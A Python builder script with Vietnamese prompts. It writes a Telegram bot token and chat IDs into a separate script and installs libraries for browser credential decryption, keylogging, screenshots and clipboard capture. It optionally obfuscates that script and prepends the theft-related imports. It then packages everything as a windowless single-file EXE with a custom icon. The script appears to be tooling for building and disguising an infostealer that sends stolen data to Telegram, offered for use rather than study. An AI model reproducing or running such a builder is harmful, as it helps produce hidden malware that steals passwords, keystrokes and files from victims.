import os
import subprocess

def replace_values_in_file(filename, bot_token, ID_chat, chat_id):
    with open(filename, 'r', encoding='utf-8') as file:
        content = file.read()
    content = content.replace("bot_token=''", f"bot_token='{bot_token}'")
    content = content.replace('bot_token = \'\'', f'bot_token = \'{bot_token}\'')
    content = content.replace('bot_token = ""', f'bot_token = "{bot_token}"')
    content = content.replace('ID_chat = \'\'', f'ID_chat = \'{ID_chat}\'')
    content = content.replace('ID_chat = ""', f'ID_chat = "{ID_chat}"')
    content = content.replace('chat_id = \'\'', f'chat_id = \'{chat_id}\'')
    content = content.replace('chat_id = ""', f'chat_id = "{chat_id}"')
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(content)
        
def install_dependencies():
    subprocess.run(['pip', 'install', 'requests', 'pywin32', 'pycryptodome', 'pyasn1', 'pyautogui', 'psutil', 'pyperclip', 'pynput', 'cryptography'], check=True)

def obfuscate_file(original_filename, new_filename, bot_token):
    subprocess.run(['python', 'obfu.py', original_filename, new_filename], check=True)
    header_code = """
import ctypes
import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,requests,time
import sys
import zipfile
from datetime import datetime
from Crypto.Cipher import DES3
from Crypto.Cipher import AES
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
from Crypto.Util.Padding import unpad 
from base64 import b64decode
import pyautogui
import socket
import psutil
import pyperclip
from pynput import keyboard
import threading 
import string
import argparse
import random
import os
import string
import argparse
import random
import time
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"""        
    with open(new_filename, 'r', encoding='utf-8') as file:
        content = file.read()
    with open(new_filename, 'w', encoding='utf-8') as file:
        file.write(header_code + content)
        
def main():
    bot_token = input("Nhập bot_token (API Token): ")
    ID_chat = input("Nhập ID_chat: ")
    chat_id = input("Nhập lại chat_id: ")
    python_filename = input("Nhập tên file Python (ví dụ: concac.py): ")
    replace_values_in_file(python_filename, bot_token, ID_chat, chat_id)
    install_libs = input("Bạn phải cài đặt các thư viện của python nếu muốn build EXE? (y/n): ").strip().lower()
    if install_libs == 'y':
        install_dependencies()
    obfuscate = input("Bạn có muốn mã hóa (obfuscate) file không? (y/n): ").strip().lower()
    if obfuscate == 'y':
        new_filename = input("Nhập tên file mới cho file mã hóa: ")
        obfuscate_file(python_filename, new_filename, bot_token)
        python_filename = new_filename        
    build_exe = input("Bạn có muốn build EXE không? (y/n): ").strip().lower()
    if build_exe == 'y':
        icon_filename = input("Nhập tên ảnh cho file (ví dụ: concu.ico): ")
        confirm_build = input(f"Bạn có chắc chắn muốn build EXE cho file {python_filename} với biểu tượng {icon_filename} không? (y/n): ").strip().lower()
        if confirm_build == 'y':
            subprocess.run(['pyinstaller', '--onefile', '--noconsole', f'--icon={icon_filename}', python_filename])
            print("Build thành công.")
        else:
            print("Build bị hủy bỏ.")
    else:
        print("Build bị hủy bỏ.")

if __name__ == "__main__":
    main()
